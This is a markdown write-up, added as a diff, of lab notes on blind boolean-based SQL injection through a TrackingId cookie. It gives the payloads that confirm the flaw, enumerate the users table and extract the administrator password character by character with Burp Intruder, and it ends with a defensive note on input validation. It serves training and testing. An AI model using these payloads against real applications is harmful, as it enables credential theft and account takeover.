@@ -1,0 +1,71 @@
+# Blind SQL Injection — Notes (No Error Message / No Query in Response)
+
+> Personal lab notes, cleaned up for a GitHub write-up. Testing was done against an intentionally vulnerable training lab, not a live/production system.
+
+## Approach
+
+For any injection test, the first thing is to find out whether the application is vulnerable at all, and then figure out the DB type, since that determines which payloads will work.
+
+**Q1: How do you find the DB type / confirm the vuln?**
+
+In this lab, the application uses a `TrackingId` cookie to identify the user and for analytics. The cookie value is sent with the very first request, so that's the injection point to test.
+
+Blind SQLi is harder to spot than error-based injection (no error text, no query output in the response), but it's still exploitable. Three approaches:
+
+1. Using delays (time-based)
+2. Using logical operators, e.g. `AND '1'='1'`
+3. OAST (out-of-band) — fallback if the first two don't show a difference
+
+## Steps
+
+1. Load the application and notice the `TrackingId` is sent on the very first request — that's the parameter to target.
+2. Visit the shop's front page, and use Burp Suite to intercept the request containing the `TrackingId` cookie. Say the original value is `TrackingId=xyz`.
+3. Change the cookie to:
+   ```
+   TrackingId=xyz' AND '1'='1
+   ```
+   The "Welcome back" message appears.
+4. Change it to:
+   ```
+   TrackingId=xyz' AND '1'='2
+   ```
+   The "Welcome back" message disappears. This confirms a single boolean condition can be inferred from the response.
+5. Change it to:
+   ```
+   TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+   ```
+   Condition is true → confirms a `users` table exists.
+6. Change it to:
+   ```
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+   ```
+   Condition is true → confirms an `administrator` user exists.
+7. Determine password length by incrementing a bound:
+   ```
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+   ```
+   Repeat with `>2`, `>3`, etc. (manually via Burp Repeater, since the length is short). When "Welcome back" stops appearing, that's the length — in this case 20 characters.
+8. For extracting each character, switch to Burp Intruder (too many requests for Repeater):
+   ```
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+   ```
+9. Mark the payload position around the final `a`:
+   ```
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+   ```
+10. Payload set: Simple list, lowercase `a-z` and `0-9` (password is assumed lowercase alphanumeric).
+11. Add a Grep - Match rule for `Welcome back` so Intruder flags which payload hit.
+12. Run the attack, check the `Welcome back` column for the row with a match — that's the character at that position.
+13. Repeat for each offset (1 → 20) by changing the `SUBSTRING` offset.
+14. Alternative: use Intruder's **Cluster bomb** attack type with two payload positions (offset + character) to cover all combinations in one run instead of iterating manually.
+15. Log in as `administrator` with the recovered password via **My account**.
+
+I also wrote a small Python script to automate pulling the password character-by-character instead of doing it manually in Intruder.
+
+## Notes
+
+For a more elegant solution, instead of iterating over every character linearly, a binary search over the character space would cut down requests. The two-position Cluster bomb approach mentioned in step 14 is the Intruder-native way to do this in one attack.
+
+## Open Questions
+
+**Q2:** Why does the `TrackingId` accept arbitrary query syntax at all? It's meant to be an identifier, so it should be validated against an expected format/rule set (e.g. a fixed-length token or UUID) before ever reaching a query — instead it's being concatenated directly into SQL.
